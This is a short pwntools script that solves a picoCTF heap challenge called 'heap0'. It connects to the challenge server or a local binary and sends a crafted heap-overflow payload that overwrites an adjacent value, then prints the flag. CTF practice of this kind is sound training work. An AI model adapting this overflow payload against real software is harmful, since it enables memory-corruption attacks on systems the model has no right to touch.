from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
CHALL_PATH = "./heap0"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
brva 0x15BF
c
"""

context.arch = "amd64"

if args.REMOTE:
    c = remote("tethys.picoctf.net", 53502)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
    else:
        c = process(CHALL_PATH)

c.recvuntil(b"Enter your choice: ")
c.sendline(b"2")
c.recvuntil(b"Data for buffer: ")

#AAAAAAAAAAAAAAAA000000000000000!cico
input_data = b"A" * 0x10
input_data += b"\x00" * 15
input_data += b"\x21" 
input_data += b"cico"
c.sendline(input_data)
c.recvuntil(b"Enter your choice: ")
c.sendline(b"1")

# Split the output into lines for better control
output_str = c.recvuntil(b"Enter your choice: ")
lines = output_str.splitlines()

# Print the output tidily
for line in lines:
    print(line)
c.sendline(b"4")
print(c.recvuntil(b"}"))

c.interactive()
